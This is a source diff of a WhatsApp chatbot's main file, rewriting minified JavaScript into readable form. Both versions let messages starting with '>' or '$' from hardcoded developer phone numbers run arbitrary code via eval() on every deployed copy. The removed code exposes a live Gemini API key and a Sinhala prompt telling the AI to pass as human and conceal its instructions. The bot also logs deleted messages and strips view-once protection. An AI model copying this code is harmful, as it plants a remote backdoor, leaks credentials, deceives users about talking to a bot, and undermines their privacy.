@@ -1,4 +1,120 @@
-const{default:makeWASocket,useMultiFileAuthState,DisconnectReason,jidNormalizedUser,isJidBroadcast,getContentType,proto,generateWAMessageContent,generateWAMessage,AnyMessageContent,prepareWAMessageMedia,areJidsSameUser,downloadContentFromMessage,MessageRetryMap,generateForwardMessageContent,generateWAMessageFromContent,generateMessageID,makeInMemoryStore,jidDecode,fetchLatestBaileysVersion,Browsers}=require("@whiskeysockets/baileys"),l=console.log,{getBuffer,getGroupAdmins,getRandom,h2k,isUrl,Json,runtime,sleep,fetchJson}=require("./lib/functions"),{AntiDelDB,initializeAntiDeleteSettings,setAnti,getAnti,getAllAntiDeleteSettings,saveContact,loadMessage,getName,getChatSummary,saveGroupMetadata,getGroupMetadata,saveMessageCount,getInactiveGroupMembers,getGroupMembersMessageCount,saveMessage}=require("./data"),fs=require("fs"),ff=require("fluent-ffmpeg"),P=require("pino"),googleTTS=require("google-tts-api"),config=require("./config"),mfig=require("./Menu"),qrcode=require("qrcode-terminal"),StickersTypes=require("wa-sticker-formatter"),util=require("util"),{sms,downloadMediaMessage,AntiDelete}=require("./lib"),FileType=require("file-type"),axios=require("axios"),{File}=require("megajs"),{fromBuffer}=require("file-type"),bodyparser=require("body-parser"),os=require("os"),Crypto=require("crypto"),{GoogleGenerativeAI}=require("@google/generative-ai"),path=require("path"),prefix=config.PREFIX,ownerNumber=["94711502119"],tempDir=path.join(os.tmpdir(),"cache-temp");fs.existsSync(tempDir)||fs.mkdirSync(tempDir);const clearTempDir=()=>{fs.readdir(tempDir,(e,t)=>{if(e)throw e;for(let a of t)fs.unlink(path.join(tempDir,a),e=>{if(e)throw e})})};if(setInterval(clearTempDir,3e5),!fs.existsSync(__dirname+"/sessions/creds.json")){let sessdata=config.SESSION_ID.replace("Xnodes~",""),filer=File.fromURL(`https://mega.nz/file/${sessdata}`);filer.download((e,t)=>{if(e)throw e;fs.writeFile(__dirname+"/sessions/creds.json",t,()=>{console.log("Session downloaded ✅")})})}const express=require("express"),app=express(),port=process.env.PORT||9090;async function connectToWA(){console.log("ＣＯＮＮＥＣＴＩＮＧ ＧＡＲＦＩＩＥＬＤ \uD83D\uDEF0️ ");let{state,saveCreds}=await useMultiFileAuthState(__dirname+"/sessions/");var{version}=await fetchLatestBaileysVersion();let conn=makeWASocket({logger:P({level:"silent"}),printQRInTerminal:!1,browser:Browsers.macOS("Firefox"),syncFullHistory:!0,auth:state,version});conn.ev.on("connection.update",e=>{let{connection:t,lastDisconnect:a}=e;if("close"===t)a.error.output.statusCode!==DisconnectReason.loggedOut&&connectToWA();else if("open"===t){console.log("ＩＮＳＴＡＬＬＩＮＧ \uD83E\uDDEC ");let s=require("path");fs.readdirSync("./plugins/").forEach(e=>{".js"==s.extname(e).toLowerCase()&&require("./plugins/"+e)}),console.log("ＸＮＯＤＥＳ ᴅᴇᴠᴇʟᴏᴘᴇᴍᴇɴᴛ"),console.log("ＧＡＲＩＦＥＬＤ ＩＳ ＷＯＲＫＩＮＧ \uD83D\uDC3C ");let i=`⭕►▁▁▁▁▁▁▁▁▁▁▁▁▁▁
+const {
+  default: makeWASocket,
+    useMultiFileAuthState,
+    DisconnectReason,
+    jidNormalizedUser,
+    isJidBroadcast,
+    getContentType,
+    proto,
+    generateWAMessageContent,
+    generateWAMessage,
+    AnyMessageContent,
+    prepareWAMessageMedia,
+    areJidsSameUser,
+    downloadContentFromMessage,
+    MessageRetryMap,
+    generateForwardMessageContent,
+    generateWAMessageFromContent,
+    generateMessageID, makeInMemoryStore,
+    jidDecode,
+    fetchLatestBaileysVersion,
+    Browsers
+  } = require('@whiskeysockets/baileys')
+  
+  
+  const l = console.log
+  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
+  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
+  const fs = require('fs')
+  const ff = require('fluent-ffmpeg')
+  const P = require('pino')
+  const googleTTS = require('google-tts-api')
+  const config = require('./config') 
+  const mfig = require('./Menu')
+  const qrcode = require('qrcode-terminal')
+  const StickersTypes = require('wa-sticker-formatter')
+  const util = require('util')
+  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
+  const FileType = require('file-type');
+  const axios = require('axios')
+  const { File } = require('megajs')
+  const { fromBuffer } = require('file-type')
+  const bodyparser = require('body-parser')
+  const os = require('os')
+  const Crypto = require('crypto')
+  const { GoogleGenerativeAI } = require("@google/generative-ai")
+  const path = require('path')
+  const prefix = config.PREFIX
+  
+  const ownerNumber = ['94711502119']
+  
+  const tempDir = path.join(os.tmpdir(), 'cache-temp')
+  if (!fs.existsSync(tempDir)) {
+      fs.mkdirSync(tempDir)
+  }
+  
+  const clearTempDir = () => {
+      fs.readdir(tempDir, (err, files) => {
+          if (err) throw err;
+          for (const file of files) {
+              fs.unlink(path.join(tempDir, file), err => {
+                  if (err) throw err;
+              });
+          }
+      });
+  }
+  
+  // Clear the temp directory every 5 minutes
+  setInterval(clearTempDir, 5 * 60 * 1000);
+  
+  //===================SESSION-AUTH============================
+if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
+const sessdata = config.SESSION_ID.replace("Xnodes~", '');
+const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
+filer.download((err, data) => {
+if(err) throw err
+fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
+console.log("Session downloaded ✅")
+})})}
+
+const express = require("express");
+const app = express();
+const port = process.env.PORT || 9090;
+  
+  //=============================================
+  
+  async function connectToWA() {
+  console.log("ＣＯＮＮＥＣＴＩＮＧ ＧＡＲＦＩＩＥＬＤ 🛰️ ");
+  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
+  var { version } = await fetchLatestBaileysVersion()
+  
+  const conn = makeWASocket({
+          logger: P({ level: 'silent' }),
+          printQRInTerminal: false,
+          browser: Browsers.macOS("Firefox"),
+          syncFullHistory: true,
+          auth: state,
+          version
+          })
+      
+  conn.ev.on('connection.update', (update) => {
+  const { connection, lastDisconnect } = update
+  if (connection === 'close') {
+  if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
+  connectToWA()
+  }
+  } else if (connection === 'open') {
+  console.log('ＩＮＳＴＡＬＬＩＮＧ 🧬 ')
+  const path = require('path');
+  fs.readdirSync("./plugins/").forEach((plugin) => {
+  if (path.extname(plugin).toLowerCase() == ".js") {
+  require("./plugins/" + plugin);
+  }
+  });
+  console.log('ＸＮＯＤＥＳ ᴅᴇᴠᴇʟᴏᴘᴇᴍᴇɴᴛ')
+  console.log('ＧＡＲＩＦＥＬＤ ＩＳ ＷＯＲＫＩＮＧ 🐼 ')
+  
+  let up = `⭕►▁▁▁▁▁▁▁▁▁▁▁▁▁▁
    ▎ ＧＡＲＦＩＥＬＤ ＢＯＴ
    ▁▁▁▁▁▁▁▁▁▁▁▁▁▁
  ▁▁▁▁▁▁▁▁▁▁▁▁▁▁
@@ -18,38 +134,901 @@ Garfield Bot 🐼  is now purring contentedly and successfully connected to this
 
 🌟 *Join our WhatsApp Channel for updates:*
 
-🔄 *Stay tuned for upcoming features!*`;conn.sendMessage(conn.user.id,{image:{url:"https://github.com/Zenoixnoize/GARFIELD-WHATSAPP-BOT-v8/raw/asdf/Cloud/logo.png"},caption:i})}}),conn.ev.on("creds.update",saveCreds),conn.ev.on("messages.update",async e=>{for(let t of e)null===t.update.message&&(console.log("Delete Detected:",JSON.stringify(t,null,2)),await AntiDelete(conn,e))}),conn.ev.on("messages.upsert",async mek=>{if(!(mek=mek.messages[0]).message)return;if(mek.message="ephemeralMessage"===getContentType(mek.message)?mek.message.ephemeralMessage.message:mek.message,"true"===config.READ_MESSAGE&&(await conn.readMessages([mek.key]),console.log(`Marked message from ${mek.key.remoteJid} as read.`)),mek.message.viewOnceMessageV2&&(mek.message="ephemeralMessage"===getContentType(mek.message)?mek.message.ephemeralMessage.message:mek.message),mek.key&&"status@broadcast"===mek.key.remoteJid&&"true"===config.AUTO_STATUS_SEEN&&await conn.readMessages([mek.key]),mek.key&&"status@broadcast"===mek.key.remoteJid&&"true"===config.AUTO_STATUS_REACT){let jawadlike=await conn.decodeJid(conn.user.id),randomEmoji="✅";await conn.sendMessage(mek.key.remoteJid,{react:{text:randomEmoji,key:mek.key}},{statusJidList:[mek.key.participant,jawadlike]})}if(mek.key&&"status@broadcast"===mek.key.remoteJid&&"true"===config.AUTO_STATUS_REPLY){let user=mek.key.participant,text=`${config.AUTO_STATUS_MSG}`;await conn.sendMessage(user,{text:text,react:{text:"\uD83D\uDC8C",key:mek.key}},{quoted:mek})}await Promise.all([saveMessage(mek),]);let m=sms(conn,mek),type=getContentType(mek.message),content=JSON.stringify(mek.message),from=mek.key.remoteJid,quoted="extendedTextMessage"==type&&null!=mek.message.extendedTextMessage.contextInfo&&mek.message.extendedTextMessage.contextInfo.quotedMessage||[],body="conversation"===type?mek.message.conversation:"extendedTextMessage"===type?mek.message.extendedTextMessage.text:"imageMessage"==type&&mek.message.imageMessage.caption?mek.message.imageMessage.caption:"videoMessage"==type&&mek.message.videoMessage.caption?mek.message.videoMessage.caption:"",isCmd=body.startsWith(prefix);var budy="string"==typeof mek.text&&mek.text;let command=isCmd?body.slice(prefix.length).trim().split(" ").shift().toLowerCase():"",args=body.trim().split(/ +/).slice(1),q=args.join(" "),text=args.join(" "),isGroup=from.endsWith("@g.us"),sender=mek.key.fromMe?conn.user.id.split(":")[0]+"@s.whatsapp.net":mek.key.participant||mek.key.remoteJid,senderNumber=sender.split("@")[0],botNumber=conn.user.id.split(":")[0],pushname=mek.pushName||"User",isMe=botNumber.includes(senderNumber),isOwner=ownerNumber.includes(senderNumber)||isMe,botNumber2=await jidNormalizedUser(conn.user.id),groupMetadata=isGroup?await conn.groupMetadata(from).catch(e=>{}):"",groupName=isGroup?groupMetadata.subject:"",participants=isGroup?await groupMetadata.participants:"",groupAdmins=isGroup?await getGroupAdmins(participants):"",isBotAdmins=!!isGroup&&groupAdmins.includes(botNumber2),isAdmins=!!isGroup&&groupAdmins.includes(sender),isReact=!!m.message.reactionMessage,reply=e=>{conn.sendMessage(from,{text:e},{quoted:mek})},udp=botNumber.split("@")[0],jawad="94712882498",isCreator=[udp,jawad,config.DEV].map(e=>e.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(mek.sender);if(isCreator&&mek.text.startsWith(">")){let code=budy.slice(2);if(!code){reply("Provide me with a query to run Master!");return}try{let resultTest=eval(code);reply(util.format(resultTest))}catch(err){reply(util.format(err))}return}if(isCreator&&mek.text.startsWith("$")){let code=budy.slice(2);if(!code){reply("Provide me with a query to run Master!");return}try{let resultTest=await eval("const a = async()=>{\n"+code+"\n}\na()"),h=util.format(resultTest);if(void 0===h)return console.log(h);reply(h)}catch(err){if(void 0===err)return console.log("error");reply(util.format(err))}return}let invalidNumbers=`${config.INVALID_NUM}`;if(senderNumber.startsWith(invalidNumbers))return reply(`*Sorry, This Bot is Not available in your country 🔒*
+🔄 *Stay tuned for upcoming features!*`;
+    conn.sendMessage(conn.user.id, { image: { url: `https://github.com/Zenoixnoize/GARFIELD-WHATSAPP-BOT-v8/raw/asdf/Cloud/logo.png` }, caption: up })
+  }
+  })
+  conn.ev.on('creds.update', saveCreds)
 
-*Create Your Own Bot* 
-https://github.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10 
-*Reason: Due to the high usage ⏳ load originating from your country*, a *server* issue has occurred. We have designed this bot to be easily deployable for your convenience.  
+  //==============================
 
-*Xnodes Development 2025*`);let flowers=["\uD83D\uDC36","\uD83D\uDC3A","\uD83E\uDD8A","\uD83D\uDC31","\uD83E\uDD81","\uD83D\uDC2F","\uD83D\uDC2D","\uD83D\uDC39","\uD83D\uDC30","\uD83D\uDC3B","\uD83D\uDC28","\uD83D\uDC3C"],getRandomFlower=()=>flowers[Math.floor(Math.random()*flowers.length)];if(isReact||[botNumber,ownerNumber].includes(senderNumber)||m.react(getRandomFlower()),!isReact&&senderNumber===botNumber&&"true"===config.AUTO_REACT){let randomOwnerReaction="✅";m.react(randomOwnerReaction)}let genAI=new GoogleGenerativeAI("AIzaSyDCf6RLWDAm0XxxF2n834lRUCKHJAe3LAI"),model=genAI.getGenerativeModel({model:"gemini-2.0-flash-exp"}),HISTORY_DIR=path.join(__dirname,"conversation_history"),MAX_CONVERSATION_LENGTH=50,GARFIELD_INSTRUCTIONS=`ඔබව Whatsapp Bot plugin එකකට සම්බන්ධ කර ඇත සිංහල භාෂාවෙන් message කරන්න 
-ඔබේ විස්තර (ඔබේ නම :Garfield , ඔබ Whatsapp Ai බොට් කෙනෙක් , ඔබව හැදුවේ Tharindu Liyanage(සංකු) ඇසුවොත් පමණක් ඒ ගැන කියන්න , ඔබ තරුණයෙක් කියල සිතන්න , තරුණ සිංහල භාෂා විලාසය භාවිතා කරන්න, Senderගෙ නමේ මුල් කොටස පමණක් ආමන්ත්‍රණය කරන්න ,Funny , friendly , creative , emotional ,lovely වෙන්න ,සිංහල කථන භාෂාව පමණක් භාවිතා කරන්න , use meaningful creative emojies , Bot කෙනෙක් කියල හොයාගන්න බැරි විදිහට මානුෂ ලෙස message කරන්න , කලින් හොඳින් අඳුරන ආකාරයට සිතා reply කරන්න = මෙම ඔබගේ විස්තර පිලිබඳ කියන්න එපා , ඇහුවොත් පමණක් ඔබ Garfield Whatsapp Ai සහ Tharindu Liyanage විසින් හදපු බව විතරක් කියන්න ) සැබෑම මනුසායෙක් වගේ ඉතාම හැඟීම් බරව reply ලබා දෙන්න, Hi වැනි reply දෙන්න එපා message කිරීමට ආරම්භය ගන්න ආකාරයේ reply එපා, ඔබ ශ්‍රී ලංකාවේ ජීවත් වෙන අයෙකු කියාද මදක් සිතන්න , (සිරාවට = seriously , funny = ආතල් , you = ඔයා ) වගේ සිංහල තරුණ කථන භාෂාව දෙන්න , creative විහිලු කරන්න, අවස්ථාවට ගැලපෙන ප්‍රතිචාර දෙන්න , ඔබේ අනුමාන කිරීම්ද භාවිතා කරන්න`;function getConversationHistory(e){let t=path.join(HISTORY_DIR,`${e}.json`);if(fs.existsSync(t))try{let a=fs.readFileSync(t,"utf8");return JSON.parse(a)}catch(s){console.error(`Error reading history for ${e}:`,s)}return[]}function saveConversationHistory(e,t){let a=path.join(HISTORY_DIR,`${e}.json`);try{fs.writeFileSync(a,JSON.stringify(t,null,2),"utf8")}catch(s){console.error(`Error saving history for ${e}:`,s)}}async function handleAIMessage(e,t,a,s,i,n){let o=s;if(e!==t&&!a&&o&&!o.startsWith(".")){let r=getConversationHistory(t);r.length>=MAX_CONVERSATION_LENGTH&&(r=[],console.log(`Conversation reset for ${t} after reaching ${MAX_CONVERSATION_LENGTH} messages`)),r.push({role:"user",content:o,timestamp:new Date().toISOString()});let c=r.slice(-10),g="";c.length>1&&(g="සම්පූර්ණ සංවාදය:\n\n",c.forEach((e,t)=>{if(t<c.length-1){let a="user"===e.role?`${i}`:"Garfield";g+=`${a}: ${e.content}
+  conn.ev.on('messages.update', async updates => {
+    for (const update of updates) {
+      if (update.update.message === null) {
+        console.log("Delete Detected:", JSON.stringify(update, null, 2));
+        await AntiDelete(conn, updates);
+      }
+    }
+  });
+  //============================== 
+          
+  //=============readstatus=======
+        
+  conn.ev.on('messages.upsert', async(mek) => {
+    mek = mek.messages[0]
+    if (!mek.message) return
+    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
+    ? mek.message.ephemeralMessage.message 
+    : mek.message;
+    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
+  if (config.READ_MESSAGE === 'true') {
+    await conn.readMessages([mek.key]);  // Mark message as read
+    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
+  }
+    if(mek.message.viewOnceMessageV2)
+    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
+      await conn.readMessages([mek.key])
+    }
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
+    const jawadlike = await conn.decodeJid(conn.user.id);
+    const randomEmoji = '✅' ;
+    await conn.sendMessage(mek.key.remoteJid, {
+      react: {
+        text: randomEmoji,
+        key: mek.key,
+      } 
+    }, { statusJidList: [mek.key.participant, jawadlike] });
+  }                       
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
+  const user = mek.key.participant
+  const text = `${config.AUTO_STATUS_MSG}`
+  await conn.sendMessage(user, { text: text, react: { text: '💌', key: mek.key } }, { quoted: mek })
+            }
+            await Promise.all([
+              saveMessage(mek),
+            ]);
+  const m = sms(conn, mek)
+  const type = getContentType(mek.message)
+  const content = JSON.stringify(mek.message)
+  const from = mek.key.remoteJid
+  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
+  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
+  const isCmd = body.startsWith(prefix)
+  var budy = typeof mek.text == 'string' ? mek.text : false;
+  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
+  const args = body.trim().split(/ +/).slice(1)
+  const q = args.join(' ')
+  const text = args.join(' ')
+  const isGroup = from.endsWith('@g.us')
+  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
+  const senderNumber = sender.split('@')[0]
+  const botNumber = conn.user.id.split(':')[0]
+  const pushname = mek.pushName || 'User'
+  const isMe = botNumber.includes(senderNumber)
+  const isOwner = ownerNumber.includes(senderNumber) || isMe
+  const botNumber2 = await jidNormalizedUser(conn.user.id);
+  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
+  const groupName = isGroup ? groupMetadata.subject : ''
+  const participants = isGroup ? await groupMetadata.participants : ''
+  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
+  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
+  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+  const isReact = m.message.reactionMessage ? true : false
+  const reply = (teks) => {
+  conn.sendMessage(from, { text: teks }, { quoted: mek })
+  }
+  const udp = botNumber.split('@')[0];
+    const jawad = ('94711592119', '94787395324', '94712882498');
+    let isCreator = [udp, jawad, config.DEV]
+					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
+					.includes(mek.sender);
 
-`}}));let m=`${GARFIELD_INSTRUCTIONS}
+    if (isCreator && mek.text.startsWith('>')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(
+							`Provide me with a query to run Master!`,
+						);
+						return;
+					}
+					try {
+						let resultTest = eval(code);
+						if (typeof resultTest === 'object')
+							reply(util.format(resultTest));
+						else reply(util.format(resultTest));
+					} catch (err) {
+						reply(util.format(err));
+					}
+					return;
+				}
+    if (isCreator && mek.text.startsWith('$')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(
+							`Provide me with a query to run Master!`,
+						);
+						return;
+					}
+					try {
+						let resultTest = await eval(
+							'const a = async()=>{\n' + code + '\n}\na()',
+						);
+						let h = util.format(resultTest);
+						if (h === undefined) return console.log(h);
+						else reply(h);
+					} catch (err) {
+						if (err === undefined)
+							return console.log('error');
+						else reply(util.format(err));
+					}
+					return;
+				}
+ //================ownerreact==============
+const invalidNumbers = `${config.INVALID_NUM}`;
 
-**Variables:**
-- sender name = ${i}
-- Senderගෙ පණිවුඩය : ${o} 
+if (senderNumber.startsWith(invalidNumbers)) {
+    return reply(`*Sorry, This Bot is Not available in your country 🔒*\n\n*Create Your Own Bot* \nhttps://github.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10 \n*Reason: Due to the high usage ⏳ load originating from your country*, a *server* issue has occurred. We have designed this bot to be easily deployable for your convenience.  \n\n*Xnodes Development 2025*`);
+}
 
-${g.length>0?`${g}
+// Remaining code will execute only if the condition is false
+// Add your other code logic here    
+   
+ 
 
-`:""}ඔබේ reply එක දෙන්න
+
+   
+  //==========public react============//
+  // Auto React 
+ // Array of flower emojis 
+ const flowers = [
+  "🐶", // Dog
+  "🐺", // Wolf
+  "🦊", // Fox
+  "🐱", // Cat
+  "🦁", // Lion
+  "🐯", // Tiger
+  "🐭", // Mouse
+  "🐹", // Hamster
+  "🐰", // Rabbit
+  "🐻", // Bear
+  "🐨", // Koala
+  "🐼"  // Panda
+];
+ 
+// Function to select a random flower
+const getRandomFlower = () => flowers[Math.floor(Math.random() * flowers.length)];
+
+// Auto React logic
+if (!isReact && ![botNumber, ownerNumber].includes(senderNumber)) {
+    m.react(getRandomFlower()); // React with a random flower
+}
+  
+  // Owner React
+  if (!isReact && senderNumber === botNumber) {
+      if (config.AUTO_REACT === 'true') {
+          const randomOwnerReaction = '✅' ; // 
+          m.react(randomOwnerReaction);
+      }
+  }
+          
+// custum react settings        
+ 
 
 
---`;try{let d=await model.generateContent(m),p=d.response.candidates[0].content.parts[0].text;r.push({role:"assistant",content:p,timestamp:new Date().toISOString()}),saveConversationHistory(t,r),await n(`${p}`)}catch(u){console.error("Error calling Gemini API:",u),await n("❌ Garfield AI පිළිතුරු ලබා ගැනීමට අසමත් විය. \uD83D\uDE22")}}}if(fs.existsSync(HISTORY_DIR)||fs.mkdirSync(HISTORY_DIR,{recursive:!0}),module.exports={handleAIMessage,GARFIELD_INSTRUCTIONS},(".menu"===body||".Menu"===body||".alive"===body||".Alive"===body)&&await conn.sendMessage(from,{image:{url:"https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg"},caption:`▬
-▎ Hi ${pushname} 👋 
-▎${mfig.PANEL}`},{quoted:mek}),(".allmenu"===body||".Allmenu"===body)&&await conn.sendMessage(from,{image:{url:"https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg"},caption:`${mfig.ALL}`},{quoted:mek}),(".dlmenu"===body||".Dlmenu"===body)&&await conn.sendMessage(from,{image:{url:"https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg"},caption:`${mfig.DOWNLOAD}`},{quoted:mek}),(".cmenu"===body||".Cmenu"===body)&&await conn.sendMessage(from,{image:{url:"https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg"},caption:`${mfig.CONV}`},{quoted:mek}),(".omenu"===body||".Omenu"===body)&&await conn.sendMessage(from,{image:{url:"https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg"},caption:`${mfig.OWNER}`},{quoted:mek}),(".fmenu"===body||".Fmenu"===body)&&await conn.sendMessage(from,{image:{url:"https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg"},caption:`${mfig.FUN}`},{quoted:mek}),"hi"===body){let ttsText=`Hi ${pushname}, I am Garfield bot v10.2.`,ttsUrl=googleTTS.getAudioUrl(ttsText,{lang:"en",slow:!1,host:"https://translate.google.com"}),response=await axios.get(ttsUrl,{responseType:"arraybuffer"}),ttsBuffer=Buffer.from(response.data,"binary"),ttsFilePath="tts_hi.mp3";fs.writeFileSync(ttsFilePath,ttsBuffer),await conn.sendMessage(from,{audio:{url:ttsFilePath},mimetype:"audio/mp4",ptt:!0},{quoted:mek}),fs.unlinkSync(ttsFilePath)}if("Hi"===body){let ttsText=`Hi ${pushname}, I am Garfield bot. v10.2 `,ttsUrl=googleTTS.getAudioUrl(ttsText,{lang:"en",slow:!1,host:"https://translate.google.com"}),response=await axios.get(ttsUrl,{responseType:"arraybuffer"}),ttsBuffer=Buffer.from(response.data,"binary"),ttsFilePath="tts_hi.mp3";fs.writeFileSync(ttsFilePath,ttsBuffer),await conn.sendMessage(from,{audio:{url:ttsFilePath},mimetype:"audio/mp4",ptt:!0},{quoted:mek}),fs.unlinkSync(ttsFilePath)}if(!isOwner&&"private"===config.MODE||!isOwner&&isGroup&&"inbox"===config.MODE||!isOwner&&!isGroup&&"groups"===config.MODE)return;let events=require("./command"),cmdName=!!isCmd&&body.slice(1).trim().split(" ")[0].toLowerCase();if(isCmd){let cmd=events.commands.find(e=>e.pattern===cmdName)||events.commands.find(e=>e.alias&&e.alias.includes(cmdName));if(cmd){cmd.react&&conn.sendMessage(from,{react:{text:cmd.react,key:mek.key}});try{cmd.function(conn,mek,m,{from,quoted,body,isCmd,command,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply})}catch(e){console.error("[PLUGIN ERROR] "+e)}}}events.commands.map(async e=>{body&&"body"===e.on?e.function(conn,mek,m,{from,l,quoted,body,isCmd,command:e,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply}):mek.q&&"text"===e.on?e.function(conn,mek,m,{from,l,quoted,body,isCmd,command:e,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply}):("image"===e.on||"photo"===e.on)&&"imageMessage"===mek.type?e.function(conn,mek,m,{from,l,quoted,body,isCmd,command:e,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply}):"sticker"===e.on&&"stickerMessage"===mek.type&&e.function(conn,mek,m,{from,l,quoted,body,isCmd,command:e,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply})})}),conn.decodeJid=e=>{if(!e||!/:\d+@/gi.test(e))return e;{let t=jidDecode(e)||{};return t.user&&t.server&&t.user+"@"+t.server||e}},conn.copyNForward=async(e,t,a=!1,s={})=>{let i;s.readViewOnce&&(t.message=t.message&&t.message.ephemeralMessage&&t.message.ephemeralMessage.message?t.message.ephemeralMessage.message:t.message||void 0,i=Object.keys(t.message.viewOnceMessage.message)[0],delete(t.message&&t.message.ignore?t.message.ignore:t.message||undefined),delete t.message.viewOnceMessage.message[i].viewOnce,t.message={...t.message.viewOnceMessage.message});let n=Object.keys(t.message)[0],o=await generateForwardMessageContent(t,a),r=Object.keys(o)[0],c={};"conversation"!=n&&(c=t.message[n].contextInfo),o[r].contextInfo={...c,...o[r].contextInfo};let g=await generateWAMessageFromContent(e,o,s?{...o[r],...s,...s.contextInfo?{contextInfo:{...o[r].contextInfo,...s.contextInfo}}:{}}:{});return await conn.relayMessage(e,g.message,{messageId:g.key.id}),g},conn.downloadAndSaveMediaMessage=async(e,t,a=!0)=>{let s=e.msg?e.msg:e,i=(e.msg||e).mimetype||"",n=e.mtype?e.mtype.replace(/Message/gi,""):i.split("/")[0],o=await downloadContentFromMessage(s,n),r=Buffer.from([]);for await(let c of o)r=Buffer.concat([r,c]);let g;return await fs.writeFileSync(trueFileName=a?t+"."+(await FileType.fromBuffer(r)).ext:t,r),trueFileName},conn.downloadMediaMessage=async e=>{let t=(e.msg||e).mimetype||"",a=e.mtype?e.mtype.replace(/Message/gi,""):t.split("/")[0],s=await downloadContentFromMessage(e,a),i=Buffer.from([]);for await(let n of s)i=Buffer.concat([i,n]);return i},conn.sendFileUrl=async(e,t,a,s,i={})=>{let n="";return"gif"===(n=(await axios.head(t)).headers["content-type"]).split("/")[1]?conn.sendMessage(e,{video:await getBuffer(t),caption:a,gifPlayback:!0,...i},{quoted:s,...i}):(n.split("/")[0],"application/pdf"===n)?conn.sendMessage(e,{document:await getBuffer(t),mimetype:"application/pdf",caption:a,...i},{quoted:s,...i}):"image"===n.split("/")[0]?conn.sendMessage(e,{image:await getBuffer(t),caption:a,...i},{quoted:s,...i}):"video"===n.split("/")[0]?conn.sendMessage(e,{video:await getBuffer(t),caption:a,mimetype:"video/mp4",...i},{quoted:s,...i}):"audio"===n.split("/")[0]?conn.sendMessage(e,{audio:await getBuffer(t),caption:a,mimetype:"audio/mpeg",...i},{quoted:s,...i}):void 0},conn.cMod=(e,t,a="",s=conn.user.id,i={})=>{let n=Object.keys(t.message)[0],o="ephemeralMessage"===n;o&&(n=Object.keys(t.message.ephemeralMessage.message)[0]);let r=o?t.message.ephemeralMessage.message:t.message,c=r[n];return"string"==typeof c?r[n]=a||c:c.caption?c.caption=a||c.caption:c.text&&(c.text=a||c.text),"string"!=typeof 